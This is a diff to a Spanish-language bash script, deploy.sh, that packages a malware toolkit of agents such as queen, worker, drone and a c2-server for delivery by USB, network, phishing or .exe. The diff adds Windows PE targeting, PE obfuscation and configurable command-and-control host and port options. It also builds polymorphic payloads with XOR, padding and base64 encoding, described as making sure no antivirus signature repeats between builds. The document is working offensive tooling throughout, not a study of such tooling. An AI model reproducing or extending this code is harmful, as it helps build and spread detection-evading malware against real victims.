@@ -5,9 +5,10 @@
 # vectores de ataque (USB, red, phishing, .exe).
 #
 # Cada build produce binarios con HASH ÚNICO (XOR key aleatoria
-# + padding variable). Ninguna firma se repite entre builds.
+# + padding variable + PE obfuscation). Ninguna firma se repite.
 #
-# Uso: ./deploy.sh all | usb | network | phishing | exe
+# Uso: ./deploy.sh all|usb|network|phishing|exe [--obfuscate] \\
+#       [--c2-host HOST] [--c2-port PORT]
 # ═══════════════════════════════════════════════════════════════
 set -euo pipefail
 
@@ -19,26 +20,38 @@ fail() { echo -e "  ${RED}✗${NC} $*"; exit 1; }
 
 BASE="$(cd "$(dirname "$0")/.." && pwd)"
 BIN_DIR="${BASE}/target/release"
+WIN_BIN_DIR="${BASE}/target/x86_64-pc-windows-gnu/release"
 OUT_DIR="${BASE}/payloads"
+OBFUSCATOR="${BASE}/scripts/obfuscate_pe.py"
 mkdir -p "$OUT_DIR"
 
 # ── Polimorfismo ──
 SEED=$RANDOM
 XOR_KEY=$(( SEED % 256 ))
 PADDING=$(( RANDOM % 512 + 64 ))
+OBFUSCATE=0
+TARGET_WIN=0
 
 usage() {
-    echo "Uso: $0 all|usb|network|phishing|exe [--c2-host HOST] [--c2-port PORT]"
+    echo "Uso: $0 all|usb|network|phishing|exe [--obfuscate] [--windows] [--c2-host HOST] [--c2-port PORT]"
     exit 1
 }
 
 VECTOR="${1:-all}"; shift || true
 C2_HOST=""; C2_PORT=8444
 while [[ $# -gt 0 ]]; do case "$1" in
+    --obfuscate) OBFUSCATE=1; shift ;;
+    --windows) TARGET_WIN=1; shift ;;
     --c2-host) C2_HOST="$2"; shift 2 ;;
     --c2-port) C2_PORT="$2"; shift 2 ;;
     *) shift ;;
 esac; done
+
+# Seleccionar directorio de bins según plataforma
+if [[ $TARGET_WIN -eq 1 ]]; then
+    BIN_DIR="$WIN_BIN_DIR"
+    log "Target: Windows PE"
+fi
 
 # ── Ofuscar binario: gzip → XOR → base64 ──
 obfuscate_binary() {
@@ -56,14 +69,28 @@ print(base64.b64encode(data).decode())
 
 # ── Build: cifra todos los bins y genera el manifest ──
 build_manifest() {
-    local fmt="${1:-}"  # inline | json (optional)
+    local fmt="${1:-}"
     local manifest_file="${OUT_DIR}/manifest.txt"
     > "$manifest_file"
 
     for agent in queen worker drone honeybee weaver swarm c2-server; do
-        local bin="${BIN_DIR}/${agent}"
+        local ext=""; [[ $TARGET_WIN -eq 1 ]] && ext=".exe"
+        local bin="${BIN_DIR}/${agent}${ext}"
         [ ! -f "$bin" ] && warn "Saltando ${agent} (no compilado)" && continue
-        local b64=$(obfuscate_binary "$bin")
+
+        # PE obfuscation
+        local final_bin="$bin"
+        if [[ $OBFUSCATE -eq 1 && "$agent" != "c2-server" ]]; then
+            local obf_bin="${OUT_DIR}/obf_${agent}${ext}"
+            if python3 "$OBFUSCATOR" "$bin" "$obf_bin"; then
+                ok "${agent} PE obfuscated"
+                final_bin="$obf_bin"
+            else
+                warn "${agent} PE obfuscation failed, usando raw"
+            fi
+        fi
+
+        local b64=$(obfuscate_binary "$final_bin")
         echo "${agent}|${b64}" >> "$manifest_file"
         ok "${agent} cifrado (XOR 0x$(printf '%02x' $XOR_KEY))"
     done
